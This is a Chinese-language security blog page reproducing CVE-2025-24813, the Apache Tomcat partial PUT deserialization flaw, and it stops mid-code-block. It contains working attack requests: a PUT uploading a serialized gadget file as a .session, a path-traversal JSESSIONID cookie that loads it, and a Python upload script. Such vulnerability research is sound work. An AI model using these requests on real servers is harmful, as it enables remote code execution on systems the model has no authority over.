@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="分析一下CVE-2025-24813">
+<title>Apache Tomcat partial PUT文件上传反序列化漏洞</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="Apache Tomcat partial PUT文件上传反序列化漏洞">
+<meta property='og:description' content="分析一下CVE-2025-24813">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-28T18:26:31&#43;08:00'/><meta property='article:modified_time' content='2025-09-28T18:26:31&#43;08:00'/>
+<meta name="twitter:title" content="Apache Tomcat partial PUT文件上传反序列化漏洞">
+<meta name="twitter:description" content="分析一下CVE-2025-24813">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#环境搭建及攻击流程分析">环境搭建及攻击流程分析</a>
+      <ol>
+        <li><a href="#put文件上传分析">put文件上传分析</a></li>
+        <li><a href="#攻击复现">攻击复现</a></li>
+        <li><a href="#总结">总结</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Java安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Apache Tomcat partial PUT文件上传反序列化漏洞</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            分析一下CVE-2025-24813
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-09-28</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="apache-tomcat-partial-put文件上传反序列化漏洞">Apache Tomcat partial PUT文件上传反序列化漏洞
+</h1><p>今年年初三月份爆出来的CVE-2025-24813，Apache Tomcat partial PUT文件上传反序列化漏洞。算是一个结合了tomcat历史cve的一个漏洞，这里特此来复现一下。</p>
+<p>漏洞版本：</p>
+<ul>
+<li>11.0.0-M1 &lt;= Apache Tomcat &lt; 11.0.3</li>
+<li>10.1.0-M1 &lt;= Apache Tomcat &lt; 10.1.35</li>
+<li>9.0.0.M1 &lt;= Apache Tomcat &lt; 9.0.99</li>
+</ul>
+<p>漏洞利用条件：</p>
+<p>算是融合tomcat的CVE-2017-12615和CVE-2020-9484然后想出来的一个新的利用方式。故利用条件都是差不多的，目标环境需要满足如下几个需求：</p>
+<ul>
+<li>readOnly为false（也就是开启put、delete请求方法来操作文件，默认为true）</li>
+<li>服务器PersistenceManager配置中使用了FileStore</li>
+<li>目标环境存在可供反序列化的类。</li>
+</ul>
+<p>关于CVE-2017-12615和CVE-2020-9484的分析，可以参考我之前的文章：</p>
+<p>《<a class="link" href="https://fupanc-w1n.github.io/p/tomcat-put%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e5%92%8csession-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/"  target="_blank" rel="noopener"
+    >Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</a>》</p>
+<p>学习了这两个漏洞后，可以很容易知道，在配置不当下，是否可以用put文件上传来解决session反序列化需要的目标环境需要存在文件的难点呢？如下从原理到复现开始一步一步分析，tomcat环境为9.0.35，jdk为8u71。</p>
+<h2 id="环境搭建及攻击流程分析">环境搭建及攻击流程分析
+</h2><p>在idea上搭建tomcat环境，然后修改/conf/web.xml文件内容：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927222930194.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927222930194"
+	
+	
+></p>
+<p>就是在原配置上打开了put文件上传的权限。然后修改conf/context.xml文件内容：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927223150701.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927223150701"
+	
+	
+></p>
+<p>添加如图部分即可。其实就是将两个CVE的不当配置都结合起来，然后结合起来打。</p>
+<h3 id="put文件上传分析">put文件上传分析
+</h3><p>首先需要搞懂为什么我们要put文件上传，上传了的文件是干什么，结合两个cve来说，可以简单地认为可以上传一个文件到web目录下，并且将文件后缀设置为session，然后再调用FileStore来目录穿越加载对应的文件，故需要tomcat是在存在session反序列化漏洞的版本中，这里尝试使用tomcat9.0.20并且对原先的put文件上传的链路进行分析：</p>
+<p>从理论上来说，如下打即可：</p>
+<p>put文件上传：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">PUT</span> <span class="nn">/tomcat7_0_79_Web_exploded/ser.session</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.153.178:8087</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">67</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">{{反序列化文件内容}}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>session反序列化加载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/tomcat9_0_35_Web_exploded/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.153.178:8083</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=../../../../../../../../../../Desktop/java_learn/javaweb project/tomcat9.0.20/out/artifacts/tomcat9_0_20_Web_exploded/ser</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里目录穿越的个数说明一下，在前面的分析中，我们可以知道session文件加载的目录与put文件上传的目录分别为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/1e112f7e-49f1-4f6d-8404-dc4563d75f0c/work/Catalina/localhost/tomcat9_0_20_Web_exploded/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/Users/xxxxxxxx/Desktop/java_learn/javaweb project/tomcat9.0.20/out/artifacts/tomcat9_0_20_Web_exploded/ser
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>故这里穿了十个到xxxxxxxx目录下，然后再进行加载，但是实际上在tomcat中应该不用穿这么多层（如果使用<code>/bin/start.up</code>开启的tomcat），只用如下穿即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">../../../../webapps/tomcat9_0_20_Web_exploded/ser
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为从tomcat源码来看，webapps目录和work目录是同目录的，我这里使用的idea配合tomcat，有差别，故正常环境应该是像上述那样穿（理论上，没搭环境去试）</p>
+<p>最后尝试攻击如下：</p>
+<p>使用python脚本来上传打cc5反序列化的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://url/tomcat9_0_20_Web_exploded/ser.session&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">local_file</span> <span class="o">=</span> <span class="s2">&#34;ser.session&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">local_file</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">file_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/octet-stream&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;状态码:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回显201成功创建，在web目录找到文件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928113640358.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928113640358"
+	
+	
+></p>
+<p>然后直接打加载session文件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928113526015.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928113526015"
+	
+	
+></p>
+<p>打不通，后面仔细看了一下，cookie中的javaweb project中有一个空格，导致不能正常获取到cookie中设置的JSESSIONID的值。唉😮‍💨，因此又搭建了一个项目来进行复现，还是先put上传文件，最后成功加载文件达到反序列攻击：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928114513340.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928114513340"
+	
+	
+></p>
+<p>注意lib中的cc依赖需要存在。</p>
+<p>由此成功实现了一次put文件上传+session加载文件到达反序列化攻击。</p>
+<p>————————</p>
+<p>最后来看一下<strong>tomcat高版本对put文件上传的修复</strong>，在写入文件前对路径进行了校验：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928115448554.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928115448554"
+	
+	
+></p>
+<p>直接返回false导致不能继续写入，此时的调用栈为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">write:222, DirResourceSet (org.apache.catalina.webresources)
+</span></span><span class="line"><span class="cl">write:184, StandardRoot (org.apache.catalina.webresources)
+</span></span><span class="line"><span class="cl">doPut:590, DefaultServlet (org.apache.catalina.servlets)
+</span></span><span class="line"><span class="cl">service:663, HttpServlet (javax.servlet.http)
+</span></span><span class="line"><span class="cl">service:435, DefaultServlet (org.apache.catalina.servlets)
+</span></span><span class="line"><span class="cl">service:741, HttpServlet (javax.servlet.http)
+</span></span><span class="line"><span class="cl">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
+</span></span><span class="line"><span class="cl">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">invoke:200, StandardWrapperValve (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">invoke:96, StandardContextValve (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">invoke:490, AuthenticatorBase (org.apache.catalina.authenticator)
+</span></span><span class="line"><span class="cl">invoke:139, StandardHostValve (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">invoke:92, ErrorReportValve (org.apache.catalina.valves)
+</span></span><span class="line"><span class="cl">invoke:678, AbstractAccessLogValve (org.apache.catalina.valves)
+</span></span><span class="line"><span class="cl">invoke:74, StandardEngineValve (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">service:343, CoyoteAdapter (org.apache.catalina.connector)
+</span></span><span class="line"><span class="cl">service:408, Http11Processor (org.apache.coyote.http11)
+</span></span><span class="line"><span class="cl">process:66, AbstractProcessorLight (org.apache.coyote)
+</span></span><span class="line"><span class="cl">process:836, AbstractProtocol$ConnectionHandler (org.apache.coyote)
+</span></span><span class="line"><span class="cl">doRun:1839, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
+</span></span><span class="line"><span class="cl">run:49, SocketProcessorBase (org.apache.tomcat.util.net)
+</span></span><span class="line"><span class="cl">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
+</span></span><span class="line"><span class="cl">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
+</span></span><span class="line"><span class="cl">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
+</span></span><span class="line"><span class="cl">run:745, Thread (java.lang)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>————————————</p>
+<p>那么更高版本的tomcat呢，该怎么打，限制了目录穿越，前面的攻击方法肯定就不能生效了，然而，在put文件上传的地方，又玩出了新花样，在tomcat9.0.35下进行分析，跟进DefaultServlet类的doPut()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928144110782.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928144110782"
+	
+	
+></p>
+<p>跟进parseContentRange()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928144201549.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928144201549"
+	
+	
+></p>
+<p>检测请求包中是否有Content-Range请求头，没有的话就返回Range实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928144259995.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928144259995"
+	
+	
+></p>
+<p>也就会进入到前面预期的方法，将上传的文件放到web目录中，但是这里也可以通过控制请求头Content-Range的长度来实现文件上传（其实这也是tomcat专门被设计要实现的用于大文件分块上传功能点），继续看代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928145751596.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928145751596"
+	
+	
+></p>
+<p>要求开启partial put，然后调用ContentRange.parse()方法解析参数并且只接受byte类型的，然后保存长度封存进range对象中，最后返回了这个range对象。回退出parseContentRange()方法，继续跟进：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928150103716.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928150103716"
+	
+	
+></p>
+<p>会进入else语句，会调用executePartialPut()方法，这是一个比较关键的方法，实现了对文件的写入，关键代码如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928150728333.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928150728333"
+	
+	
+></p>
+<p>这里new File()了一个文件路径，获取的是TEMPDIR指向的路径：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928150806893.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928150806893"
+	
+	
+></p>
+<p>可以写一个jsp文件来获取一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
